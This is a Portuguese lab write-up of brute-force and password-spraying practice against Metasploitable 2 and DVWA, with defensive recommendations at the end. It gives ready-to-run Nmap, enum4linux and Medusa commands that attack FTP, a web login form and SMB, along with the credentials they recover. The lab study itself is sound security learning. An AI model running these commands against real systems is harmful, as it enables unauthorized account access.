📄 INTRODUÇÃO
Este trabalho documenta uma prática realizada para analisar técnicas de enumeração e ataques de força bruta (Brute Force) utilizando ferramentas de código aberto como Medusa e Nmap, ambas disponíveis no Kali Linux.

👉 O foco principal deste estudo é conhecer o funcionamento e a metodologia desses ataques para, posteriormente, desenvolver e implementar mecanismos de proteção mais eficazes contra eles.

Para conduzir os testes de forma ética e controlada, foram utilizados ambientes vulneráveis e controlados, como as máquinas virtuais Metasploitable 2 e DVWA (Damn Vulnerable Web Application). Os ataques simulados foram executados contra serviços de rede comuns, como FTP, SMB (Server Message Block) e formulários de login web.

⚙️ CONFIGURAÇÃO DO AMBIENTE
O ambiente de teste foi configurado em máquinas virtuais utilizando o VirtualBox para isolamento e controle.

1. Configuração das VMs: Foram utilizados Kali Linux (como máquina atacante) e Metasploitable 2 (como alvo vulnerável).

Ambas as VMs foram configuradas para estarem na mesma rede (ex: Rede Interna ou Host-Only) para permitir a comunicação direta.

2. Descoberta de IP: Após o login nas máquinas, o endereço IP da máquina vulnerável (Metasploitable 2) foi descoberto para direcionar os testes, utilizando o comando:

Bash

ip a
Exemplo de IP Alvo: 192.168.56.101

🔓 ATAQUE DE FORÇA BRUTA NO FTP
O protocolo FTP (File Transfer Protocol) foi o primeiro alvo para um ataque de força bruta.

Passos Executados:
Descoberta de Portas Abertas (Enumeração de Serviços): O Nmap foi utilizado para verificar o status do serviço FTP e outros serviços comuns:

Bash

nmap -sV -p 21,22,80,445,139 192.168.56.101
Criação de Wordlists: Wordlists simples de usuários e senhas foram criadas para o teste:

Bash

echo -e "user\nmsfadmin\nroot" > users.txt
echo -e "123456\npassword\nmsfadmin" > pass.txt
Execução do Medusa: A ferramenta Medusa foi utilizada para realizar o ataque de força bruta contra o serviço FTP, usando a lista de usuários (-U) e a lista de senhas (-P):

Bash

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
Resultado: Foi obtido sucesso na descoberta de um par de usuário e senha válido (msfadmin:msfadmin) para acesso via FTP.

🌐 ATAQUE DE FORÇA BRUTA VIA WEB (DVWA)
Um formulário de login web no DVWA foi o alvo deste ataque.

Passos Executados:
Acesso ao Alvo: Acessou-se a página de login do DVWA no navegador:

http://192.168.56.101/dvwa/login.php
Análise da Requisição: A ferramenta do programador (Developer Tools) do navegador foi utilizada para inspecionar o formato exato da requisição HTTP POST enviada ao submeter o formulário de login (nomes dos campos username, password e Login).

Execução do Medusa (HTTP Form): O Medusa foi configurado para simular o envio do formulário, especificando a página alvo (-m PAGE), os campos do formulário (-m FORM) e o texto de resposta que indica falha no login (-m 'FAIL='):

Bash

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
Resultado: Dessa forma, foi possível obter a senha de acesso para o site do DVWA.

🗄️ PASSWORD SPRAYING EM SMB
O ataque Password Spraying foi testado contra o serviço SMB, visando aplicar um pequeno conjunto de senhas populares a uma grande lista de usuários.

Passos Executados:
Enumeração de Usuários (enum4linux): A ferramenta enum4linux foi utilizada para enumerar usuários válidos no serviço SMB (porta 445 e 139):

Bash

enum4linux -a 192.168.56.101 | tee enum4_output.txt
Criação de Wordlists: Wordlists específicas para usuários e senhas foram criadas, com foco na técnica de Password Spraying:

Bash

echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWecome123\nmsfadmin" > senhas_spray.txt
Execução do Medusa (SMB): O Medusa foi utilizado contra o módulo smbnt. O ataque de Password Spraying é simulado ao manter o número de threads (-t 2) baixo para evitar bloqueios de conta (o que é comum em ambientes reais) e usar uma lista de senhas pequena.

Bash

medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
Resultado: Foi obtido sucesso com o usuário e senha msfadmin:msfadmin (e possivelmente outros pares), validando a eficácia do Password Spraying.

🛡️ RECOMENDAÇÕES E MEDIDAS DE PROTEÇÃO
Com base na análise da metodologia dos ataques, as seguintes recomendações são propostas para aumentar a segurança:

Autenticação Multifator (MFA): Implementar MFA, pois torna as credenciais obtidas por força bruta inúteis sem o segundo fator.

Monitoramento de Login: Utilizar sistemas de monitoramento para detectar altas taxas de falha de login ou tentativas de acesso de um único IP a múltiplas contas (indicativo de password spraying).

Utilização de Senhas Fortes: Forçar políticas de senhas complexas, com comprimento e diversidade de caracteres, para aumentar significativamente o tempo necessário para um ataque de força bruta.

Bloqueio de Contas/IP: Configurar o sistema para bloquear a conta ou o endereço IP de origem após um número limitado (ex: 3 a 5) de tentativas de login inválidas em um curto período de tempo.

Desabilitar Enumeração: Em serviços como SMB, configurar para limitar ou desabilitar a enumeração de usuários anônima, dificultando a fase inicial de reconhecimento do atacante.
